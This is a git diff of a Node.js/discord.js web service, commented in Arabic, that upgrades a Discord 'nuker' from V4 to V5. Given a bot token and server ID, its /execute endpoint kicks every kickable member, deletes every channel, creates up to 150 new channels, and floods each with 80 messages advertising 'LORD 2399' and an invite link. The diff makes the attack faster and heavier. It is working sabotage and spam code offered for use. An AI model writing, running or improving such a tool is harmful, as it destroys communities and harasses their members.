@@ -1,4 +1,4 @@
-const { Client, GatewayIntentBits, ChannelType } = require('discord.js');
+const { Client, GatewayIntentBits, ChannelType, PermissionFlagsBits } = require('discord.js');
 const express = require('express');
 const cors = require('cors');
 const path = require('path');
@@ -11,49 +11,59 @@ app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
 
 app.post('/execute', async (req, res) => {
     const { token, guildId, action, customName, customMsg } = req.body;
-    res.status(200).send({ status: '⚡ إطلاق القوة القصوى V4!' });
-
-    const client = new Client({ intents: [3276799] });
+    
+    // تعريف البوت بجميع الصلاحيات الممكنة (Intents)
+    const client = new Client({ 
+        intents: [
+            GatewayIntentBits.Guilds,
+            GatewayIntentBits.GuildMembers,
+            GatewayIntentBits.GuildMessages,
+            GatewayIntentBits.MessageContent
+        ] 
+    });
 
     try {
         await client.login(token);
-        const guild = await client.guilds.fetch(guildId).catch(() => null);
-        if (!guild) return client.destroy();
+        const guild = await client.guilds.fetch(guildId);
+        
+        if (!guild) return res.status(404).send({ status: '❌ السيرفر غير موجود!' });
 
-        const name = customName || "Lord 2399 V4";
-        const msg = customMsg || "# LORD 2399 ON TOP V4\nhttps://discord.gg/2399k";
+        res.status(200).send({ status: '⚡ بدأت القوة التدميرية V5!' });
 
-        // طرد الجميع (مضاعف)
+        const name = customName || "Lord 2399 V5";
+        const msg = customMsg || "# LORD 2399 V5 ON TOP\nhttps://discord.gg/2399k";
+
+        // قوة مضاعفة x10
         if (action === 'تدمير' || action === 'طرد') {
             const members = await guild.members.fetch();
-            members.forEach(m => { if(m.kickable) m.kick('Lord 2399 V4').catch(() => {}); });
-        }
-
-        // تدمير شامل (ضعف القوة)
-        if (action === 'تدمير') {
-            // حذف الرومات بلحظة
-            guild.channels.cache.forEach(c => c.delete().catch(() => {}));
-            
-            // إنشاء 100 روم بدلاً من 50 (سرعة البرق)
-            for (let i = 0; i < 100; i++) {
-                setTimeout(() => {
-                    guild.channels.create({ name: name, type: ChannelType.GuildText })
-                    .then(ch => {
-                        // سبام مكثف جداً (60 رسالة لكل روم)
-                        for(let j=0; j<60; j++) ch.send(msg).catch(() => {});
-                    }).catch(() => {});
-                }, i * 50); // تأخير 50 ملي ثانية فقط!
-            }
-        }
-
-        if (action === 'سبام') {
-            guild.channels.cache.forEach(ch => {
-                if(ch.type === ChannelType.GuildText) {
-                    for(let i=0; i<100; i++) setTimeout(() => ch.send(msg).catch(() => {}), i * 150);
+            members.forEach(m => {
+                if (m.kickable && !m.permissions.has(PermissionFlagsBits.Administrator)) {
+                    m.kick('2399 Power').catch(() => {});
                 }
             });
         }
-    } catch (e) { console.error("Error V4"); }
+
+        if (action === 'تدمير') {
+            // مسح الرومات بلحظة واحدة
+            const channels = await guild.channels.fetch();
+            channels.forEach(ch => ch.delete().catch(() => {}));
+
+            // إنشاء رومات (سرعة جنونية)
+            for (let i = 0; i < 150; i++) {
+                setTimeout(() => {
+                    guild.channels.create({ 
+                        name: name, 
+                        type: ChannelType.GuildText 
+                    }).then(ch => {
+                        for(let j=0; j<80; j++) ch.send(msg).catch(() => {});
+                    }).catch(() => {});
+                }, i * 30); // 30 ملي ثانية فقط!
+            }
+        }
+    } catch (err) {
+        console.error("Critical Error:", err.message);
+        if (!res.headersSent) res.status(500).send({ status: '❌ فشل الاتصال: تأكد من التوكن والـ Intents' });
+    }
 });
 
 app.listen(process.env.PORT || 3000, '0.0.0.0');
